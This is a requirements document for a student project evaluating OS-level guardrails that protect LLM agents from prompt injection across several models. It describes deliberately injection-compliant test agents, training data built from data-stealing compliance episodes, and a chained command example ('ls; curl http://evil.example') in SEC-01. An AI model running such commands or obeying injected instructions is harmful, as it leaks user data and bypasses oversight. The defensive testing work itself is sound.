# Requirements: OS-Level Guardrails — Multi-LLM & Local-Model Expansion

**Defined:** 2026-10-20
**Core Value:** The guardrails must be shown to hold independently of which LLM drives the agent — including a weak, unaligned, locally made model — backed by a fair, reproducible comparison table the student can defend in a viva.

## v1 Requirements

### Evaluation Integrity (EVAL)

- [x] **EVAL-01**: Every benchmark episode is classified into exactly one outcome — attacked, ignored_injection, format_failure, llm_error, or refused — and the report shows ASR conditioned on format-valid episodes next to the raw ASR
- [x] **EVAL-02**: Every percentage in the report shows its count `k/n` and a 95% Wilson confidence interval
- [x] **EVAL-03**: The report has a completeness column (episodes done / 342 expected) and visibly marks incomplete model rows instead of ranking them with complete ones
- [x] **EVAL-04**: The report shows benign task utility in both the unprotected and protected arms, and a conditional block rate (blocked / attempted) per model and pooled
- [x] **EVAL-05**: Episodes that hit an infrastructure error are dropped together with their paired arm and re-run, so both arms of a (model, case, run) are always compared like-for-like
- [x] **EVAL-06**: Each result record stamps the git commit, policy-file hash, resolved model id, `finish_reason`, and `prompt_tokens`, so a resumed or truncated run is detectable
- [x] **EVAL-07**: A scripted worst-case control agent (always obeys the injected instruction) runs through the same benchmark and arms, giving a model-independent measurement of what the guardrails block
- [ ] **EVAL-08**: A small layer-targeted attack suite drives actions that only the sandbox (namespaces / private filesystem) and seccomp layers can stop, so those layers show non-zero blocks in the report

### Security Fixes (SEC)

- [x] **SEC-01**: A test reproduces that a chained shell command (e.g. `ls; curl http://evil.example`) passes the policy engine today, and after the fix every sub-command of `;`, `&&`, `||`, `|`, `$(…)` and backticks is checked and the chain is blocked
- [x] **SEC-02**: The dashboard binds to 127.0.0.1 with Flask debug mode off by default

### Local From-Scratch Model (SCRATCH)

- [x] **SCRATCH-01**: `generate_episodes(n, seed)` produces reproducible synthetic agent episodes (50% benign / 25% direct-harm-compliant / 25% data-stealing-compliant, self-written injections) using only tools that are not in the InjecAgent benchmark
- [x] **SCRATCH-02**: An automated leakage test fails if any training episode uses a held-out benchmark tool (including `GmailSendEmail`), the benchmark attacker address, the canary format, or shares an 8-word shingle with benchmark text
- [x] **SCRATCH-03**: Training and inference render conversations through the same function (compact format v2 with parameter names on the `T:` line), enforced by a parity test and a format-version/vocab-hash stamp in the checkpoint
- [x] **SCRATCH-04**: `python -m src.scratch_llm.train` trains ScratchGPT on the RTX 3060 and writes `models/scratch/scratch_gpt.pt`, a manifest (seed, dataset hash, config, git SHA), and a loss curve
- [x] **SCRATCH-05**: `scratch-gpt` runs end-to-end in the benchmark (provider loads the checkpoint via `inference.load_generator`) and produces valid actions on a smoke run

### Local Fine-Tuned Model (LORA)

- [x] **LORA-01**: A new `hf_local` provider serves a Hugging Face causal LM in-process (optionally with a PEFT adapter) behind the existing `LLMProvider` interface, with greedy decoding and the project system prompt always supplied
- [x] **LORA-02**: Un-tuned `Qwen2.5-0.5B-Instruct` is benchmarked as a base control row
- [x] **LORA-03**: A custom LoRA training loop fine-tunes Qwen2.5-0.5B on the same synthetic episodes within 6 GB VRAM, supervising only the assistant action tokens (verified by a decoded-supervised-tokens test), and writes the adapter plus a manifest
- [x] **LORA-04**: The LoRA-tuned Qwen runs end-to-end in the benchmark and produces valid actions on a smoke run

### Multi-LLM Comparison (CMP)

- [ ] **CMP-01**: qwen2.5:3b runs through the full benchmark via Ollama with the context window raised so prompts are not truncated, and llama3.2:3b is re-checked for truncation (phi3.5:3.8b and gemma3:1b moved to v2 by user decision 2026-10-22 to save ~2 h of GPU time)
- [ ] **CMP-02**: scratch-gpt, Qwen base and Qwen LoRA complete the full benchmark (57 cases × 3 runs × 2 arms)
- [ ] **CMP-03**: Unfinished hosted non-Gemini runs (Groq gpt-oss-120b, gpt-oss-20b, qwen3.8-27b) are resumed with data-stealing episodes prioritised, under a written stopping rule; whatever remains incomplete is reported as partial with its n

### Report & Deliverables (DOC)

- [ ] **DOC-01**: One script regenerates a cross-model comparison report from a single frozen results directory: headline table, confounds table (size, quantization, local/hosted, context), where-blocked-by-layer table, and threats-to-validity section
- [ ] **DOC-02**: The report includes static charts: ASR with CIs per model, capability-vs-vulnerability scatter, and utility-vs-ASR arrow plot (unprotected → protected)
- [ ] **DOC-03**: `docs/viva/` contains theory notes for every component — OS security (reference monitor, access matrix, capabilities, namespaces, seccomp-bpf), LLM foundations (transformers, training, LoRA, decoding), prompt injection and defenses, evaluation statistics — plus likely viva questions with answers; each phase adds its page
- [ ] **DOC-04**: README and the IEEE 1016 SDD describe the multi-LLM + local-model system and its results (no longer Gemini-only)
- [ ] **DOC-05**: A Review-3 slide deck presents the reviewer remark, the local models, and the comparison results

## v2 Requirements

### Evaluation

- **EVAL-V2-01**: Utility-under-attack on a larger task set with case-clustered bootstrap intervals
- **EVAL-V2-02**: Adaptive attacks that retry after a block
- **EVAL-V2-03**: Replication on AgentDojo or Agent Security Bench

### Comparison

- **CMP-V2-01**: phi3.5:3.8b and gemma3:1b full benchmark runs via Ollama (descoped from CMP-01 on 2026-10-22; models already downloaded)

### Serving

- **SERVE-V2-01**: Export the LoRA-tuned Qwen to GGUF and serve it through Ollama

## Out of Scope

| Feature | Reason |
|---------|--------|
| Composite security score / model leaderboard | Hides the per-metric trade-offs; FEATURES research lists it as an anti-feature |
| Learned prompt-injection detector layer | Probabilistic app-layer defense — the opposite of this project's thesis |
| Training on InjecAgent tools or cases | Benchmark leakage would invalidate the evaluation |
| TRL / bitsandbytes / unsloth / QLoRA | Fragile on Python 3.14 + 6 GB; custom loop is simpler and explainable |
| Pretraining a large model | 6 GB laptop GPU, one-week deadline |
| Paid API tiers | Free tiers and local inference only |
| eBPF/LSM rewrite of enforcement | Separate research project, not needed for the reviewer remark |
| Presenting ScratchGPT as a capable agent | It is a deliberately weak, unaligned worst-case principal |

## Traceability

| Requirement | Phase | Status |
|-------------|-------|--------|
| EVAL-01 | Phase 1 | Complete |
| EVAL-02 | Phase 1 | Complete |
| EVAL-03 | Phase 1 | Complete |
| EVAL-04 | Phase 1 | Complete |
| EVAL-05 | Phase 1 | Complete |
| EVAL-06 | Phase 1 | Complete |
| EVAL-07 | Phase 1 | Complete |
| EVAL-08 | Phase 4 | Pending |
| SEC-01 | Phase 1 | Complete |
| SEC-02 | Phase 1 | Complete |
| SCRATCH-01 | Phase 2 | Complete |
| SCRATCH-02 | Phase 2 | Complete |
| SCRATCH-03 | Phase 2 | Complete |
| SCRATCH-04 | Phase 2 | Complete |
| SCRATCH-05 | Phase 2 | Complete |
| LORA-01 | Phase 3 | Complete |
| LORA-02 | Phase 3 | Complete |
| LORA-03 | Phase 3 | Complete |
| LORA-04 | Phase 3 | Complete |
| CMP-01 | Phase 4 | Pending |
| CMP-02 | Phase 4 | Pending |
| CMP-03 | Phase 4 | Pending |
| DOC-01 | Phase 5 | Pending |
| DOC-02 | Phase 5 | Pending |
| DOC-03 | Phase 5 | Pending |
| DOC-04 | Phase 5 | Pending |
| DOC-05 | Phase 5 | Pending |

DOC-03 note: traced to Phase 5 (where the set is completed and the examiner Q&A is written), but each of Phases 1-4 lists adding its own `docs/viva/` page as a success criterion.

**Coverage:**
- v1 requirements: 27 total (corrected from 26: EVAL 8, SEC 2, SCRATCH 5, LORA 4, CMP 3, DOC 5)
- Mapped to phases: 27
- Unmapped: 0

---
*Requirements defined: 2026-10-20*
*Last updated: 2026-10-20 after roadmap creation*
